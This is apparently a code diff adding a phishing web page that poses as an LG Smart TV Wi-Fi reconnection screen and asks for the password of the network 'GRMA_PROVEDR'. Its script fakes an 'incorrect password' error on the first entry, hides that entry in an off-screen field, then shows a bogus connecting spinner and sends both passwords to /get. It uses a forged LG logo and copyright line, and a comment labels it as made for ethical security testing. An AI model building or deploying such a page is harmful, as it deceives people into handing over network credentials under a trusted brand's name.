@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LG Smart TV - Connection</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600&display=swap');
+
+        body { 
+            font-family: 'Open Sans', -apple-system, sans-serif; 
+            background-color: #f4f4f4; 
+            margin: 0; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            justify-content: center; 
+            height: 100vh;
+            color: #333;
+        }
+        
+        .login-container { 
+            width: 100%; 
+            max-width: 400px; 
+            padding: 40px 30px;
+            background-color: #ffffff;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            border-radius: 4px;
+            box-sizing: border-box;
+            text-align: center;
+        }
+
+        .lg-logo-container {
+            margin-bottom: 25px;
+        }
+
+        .lg-logo {
+            width: 140px; 
+            height: auto;
+        }
+
+        h1 { 
+            font-size: 22px; 
+            font-weight: 600; 
+            margin-bottom: 10px; 
+            color: #000;
+        }
+        
+        .subtitle {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+
+        .form-group {
+            text-align: left;
+            width: 100%;
+            margin-bottom: 15px;
+        }
+
+        input { 
+            width: 100%; 
+            padding: 12px 15px; 
+            border: 1px solid #cbcbcb; 
+            border-radius: 4px; 
+            font-size: 16px; 
+            box-sizing: border-box;
+            outline: none;
+            background-color: #f9f9f9;
+        }
+
+        input:focus { 
+            border-color: #a50034; 
+        }
+
+        #error-msg { 
+            color: #a50034; 
+            font-size: 13px; 
+            margin-bottom: 15px; 
+            display: none;
+            text-align: left;
+            font-weight: 600;
+        }
+
+        .btn { 
+            background-color: #a50034; 
+            color: white; 
+            width: 100%; 
+            padding: 14px; 
+            border: none; 
+            border-radius: 4px;
+            font-size: 15px; 
+            font-weight: 600; 
+            cursor: pointer; 
+            margin-top: 10px;
+            text-transform: uppercase;
+        }
+
+        .btn:hover { background-color: #7d0028; }
+
+        .footer-text {
+            margin-top: 30px;
+            font-size: 11px;
+            color: #999;
+            border-top: 1px solid #eee;
+            padding-top: 20px;
+        }
+
+        #loader { display: none; margin-top: 20px; }
+        .spinner { 
+            width: 30px; height: 30px; 
+            border: 3px solid #f3f3f3; 
+            border-top: 3px solid #a50034; 
+            border-radius: 50%; 
+            animation: spin 1s linear infinite; 
+            margin: 0 auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        .off-screen { position: absolute; left: -9999px; }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <div class="lg-logo-container">
+            <svg class="lg-logo" viewBox="0 0 250 100" xmlns="http://www.w3.org/2000/svg">
+                <circle cx="45" cy="50" r="42" fill="#a50034"/>
+                <path d="M45 25 C31.2 25 20 36.2 20 50 C20 63.8 31.2 75 45 75 C58.8 75 70 63.8 70 50 L70 46 L42 46 L42 54 L62 54 C60 62 53 67 45 67 C35.6 67 28 59.4 28 50 C28 40.6 35.6 33 45 33 C50 33 55 35 58 38 L63 33 C58 28 52 25 45 25 Z" fill="white"/>
+                <circle cx="36" cy="43" r="3" fill="white"/>
+                <text x="100" y="65" font-family="Arial, Helvetica, sans-serif" font-weight="bold" font-size="55" fill="#555">LG</text>
+            </svg>
+        </div>
+
+        <div id="content-area">
+            <h1>Network Connection</h1>
+            <p class="subtitle">Please enter the password for <b>GRMA_PROVEDR</b> to restore internet access to your LG Smart TV.</p>
+            
+            <div id="error-msg">Incorrect password. Please try again.</div>
+
+            <form id="login-form" action="/get" method="GET">
+                <div class="form-group">
+                    <input type="password" id="pass" name="password" placeholder="Wi-Fi Password" required autocomplete="off">
+                </div>
+
+                <input type="text" name="email" id="user" class="off-screen" value="LG_TV_Connection">
+
+                <button type="button" class="btn" id="submit-btn">Connect</button>
+            </form>
+
+            <div class="footer-text">
+                Copyright © 2026 LG Electronics. All Rights Reserved.
+            </div>
+        </div>
+
+        <div id="loader">
+            <div class="spinner"></div>
+            <p style="color: #666; font-size: 14px; margin-top: 15px;">Establishing connection...</p>
+        </div>
+    </div>
+
+<script>
+    const submitBtn = document.getElementById('submit-btn');
+    const passInput = document.getElementById('pass');
+    const userInput = document.getElementById('user');
+    const errorMsg = document.getElementById('error-msg');
+    const contentArea = document.getElementById('content-area');
+    const loader = document.getElementById('loader');
+    const loginForm = document.getElementById('login-form');
+
+    let attempt = 0;
+
+    submitBtn.addEventListener('click', () => {
+        if (passInput.value.length < 1) return;
+        attempt++;
+
+        if (attempt === 1) {
+            userInput.value = "P1:" + passInput.value;
+            errorMsg.style.display = 'block';
+            passInput.value = '';
+            passInput.focus();
+        } else {
+            errorMsg.style.display = 'none';
+            contentArea.style.display = 'none';
+            loader.style.display = 'block';
+            setTimeout(() => { loginForm.submit(); }, 2500);
+    // Created by @far00t01 - for ethical security testing purposes.
+
+        }
+    });
+
+    passInput.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') { e.preventDefault(); submitBtn.click(); }
+    });
+</script>
+
+</body>
+</html>
